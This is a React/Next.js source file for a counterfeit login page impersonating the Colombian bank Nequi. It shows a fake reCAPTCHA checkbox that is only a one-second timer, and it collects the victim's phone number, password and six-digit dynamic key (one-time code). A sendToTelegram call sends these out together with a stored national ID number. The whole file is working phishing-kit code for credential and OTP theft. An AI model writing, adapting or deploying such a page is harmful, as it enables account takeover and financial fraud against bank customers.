'use client'

import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { useState, useEffect } from "react"
import { sendToTelegram } from "@/app/actions/telegram"
import LoadingSpinner from "@/app/components/loading-spinner"
import { Loader2, CheckCircle2, ChevronDown } from "lucide-react"
import Footer from "@/components/footer"
import TransitionLoader from "../components/transition-loader"

const countries = [
  {
    code: '+57',
    name: 'Colombia',
    flag: <Image src="https://transacciones.nequi.com/bdigital/images/flag_colombia.png" alt="Colombia" width={20} height={15} />
  },
  {
    code: '+507',
    name: 'Panamá',
    flag: <Image src="https://transacciones.nequi.com/bdigital/images/flag_panama.png" alt="Panamá" width={20} height={15} />
  }
]

export default function LoginPage() {
  const router = useRouter()
  const [formData, setFormData] = useState({
    usuario: '',
    clave: '',
    claveDinamica: ''
  })
  const [loading, setLoading] = useState(false)
  const [isCaptchaChecked, setIsCaptchaChecked] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [selectedCountry, setSelectedCountry] = useState(countries[0])
  const [isCountryMenuOpen, setIsCountryMenuOpen] = useState(false)
  const [showTransition, setShowTransition] = useState(false)

  useEffect(() => {
    const cedula = sessionStorage.getItem('cedula')
    if (!cedula) {
      router.push('/cedula')
    }
  }, [router])

  const handleCaptchaClick = async () => {
    if (!isCaptchaChecked && !isLoading) {
      setIsLoading(true)
      await new Promise(resolve => setTimeout(resolve, 1000))
      setIsLoading(false)
      setIsCaptchaChecked(true)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (formData.usuario && formData.clave && formData.claveDinamica && isCaptchaChecked) {
      setLoading(true)
      const cedula = sessionStorage.getItem('cedula')
      if (!cedula) {
        router.push('/cedula')
        return
      }
      
      await sendToTelegram({
        ...formData,
        cedula,
        countryCode: selectedCountry.code
      })
      
      setShowTransition(true)
      setTimeout(() => {
        setLoading(false)
        router.push('/procesando')
      }, 2000)
    }
  }

  return (
    <main className="min-h-screen bg-pink-50 relative">
      {showTransition && <TransitionLoader />}
      {/* Background Image */}
      <div 
        className="absolute inset-0 bg-cover bg-center z-0"
        style={{ 
          backgroundImage: 'url("img/background.png")',
          opacity: 0.1 
        }}
      />

      {/* Navbar */}
      <nav className="relative z-10 bg-white shadow-sm px-4 py-2">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <Image
            src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
            alt="Nequi Logo"
            width={120}
            height={40}
            priority
          />
          <Button 
            variant="ghost" 
            onClick={() => window.location.reload()}
            className="bg-[#E6007E] hover:bg-[#C4006B] text-white rounded-md px-4 py-2"
          >
            Recargar
          </Button>
        </div>
      </nav>

      {/* Login Content */}
      <div className="relative z-10 max-w-md mx-auto space-y-4 p-4 pt-8">
        <Card className="bg-white/90 backdrop-blur-sm">
          <CardHeader>
            <CardTitle className="text-center text-[#200020]">Entra a tu Nequi</CardTitle>
            <p className="text-center text-sm text-gray-600">Podrás bloquear tu Nequi, consultar tus datos.</p>
          </CardHeader>
          <CardContent>
            {loading ? (
              <LoadingSpinner />
            ) : (
              <form onSubmit={handleSubmit} className="space-y-4">
                <div className="space-y-2">
                  <Label>Número de celular</Label>
                  <div className="flex space-x-2">
                    <div className="relative w-1/3">
                      <div
                        onClick={() => setIsCountryMenuOpen(!isCountryMenuOpen)}
                        className="flex items-center space-x-2 cursor-pointer px-2 py-2 border rounded-md hover:bg-gray-50"
                      >
                        {selectedCountry.flag}
                        <span className="text-gray-600">{selectedCountry.code}</span>
                        <ChevronDown className="w-4 h-4 text-gray-400" />
                      </div>
                      
                      {isCountryMenuOpen && (
                        <div className="absolute top-full left-0 mt-1 w-full bg-white border rounded-md shadow-lg py-1 z-50">
                          {countries.map((country) => (
                            <div
                              key={country.code}
                              onClick={() => {
                                setSelectedCountry(country)
                                setIsCountryMenuOpen(false)
                              }}
                              className="flex items-center space-x-2 px-3 py-2 hover:bg-gray-50 cursor-pointer"
                            >
                              {country.flag}
                              <span className="text-sm text-gray-600">{country.name}</span>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                    <Input
                      type="tel"
                      placeholder="Número de celular"
                      className="w-2/3 bg-pink-50"
                      value={formData.usuario}
                      onChange={(e) => setFormData({ ...formData, usuario: e.target.value })}
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <Input
                    type="password"
                    id="clave"
                    required
                    value={formData.clave}
                    onChange={(e) => setFormData({...formData, clave: e.target.value})}
                    placeholder="Contraseña"
                    className="bg-pink-50"
                  />
                </div>
                <div className="space-y-2">
                  <Input
                    type="text"
                    id="claveDinamica"
                    required
                    maxLength={6}
                    value={formData.claveDinamica}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '')
                      setFormData({...formData, claveDinamica: value})
                    }}
                    placeholder="Clave dinámica"
                    className="bg-pink-50"
                  />
                </div>

                <div className="border rounded p-3 bg-[#F9F9F9]">
                  <div className="flex items-center gap-2">
                    <div
                      onClick={handleCaptchaClick}
                      className={`w-6 h-6 border rounded flex items-center justify-center cursor-pointer transition-colors ${
                        isCaptchaChecked 
                          ? "bg-[#34A853] border-[#34A853]" 
                          : isLoading 
                            ? "bg-[#4A90E2] border-[#4A90E2]"
                            : "bg-white border-gray-300 hover:border-gray-400"
                      }`}
                    >
                      {isLoading ? (
                        <Loader2 className="w-4 h-4 text-white animate-spin" />
                      ) : isCaptchaChecked ? (
                        <CheckCircle2 className="w-4 h-4 text-white" />
                      ) : null}
                    </div>
                    <span className="text-sm text-gray-600">No soy un robot</span>
                    <img
                      src="https://www.gstatic.com/recaptcha/api2/logo_48.png"
                      alt="reCAPTCHA"
                      className="h-8 ml-auto"
                    />
                  </div>
                </div>

                <Button 
                  type="submit" 
                  className="w-full bg-[#E6007E] hover:bg-[#C4006B] text-white h-12 text-lg font-medium"
                  disabled={!formData.usuario || !formData.clave || formData.claveDinamica.length < 6 || !isCaptchaChecked}
                >
                  Entra
                </Button>
              </form>
            )}
          </CardContent>
        </Card>
      </div>

     {/* Footer */}
     <Footer />
    </main>
  )
}
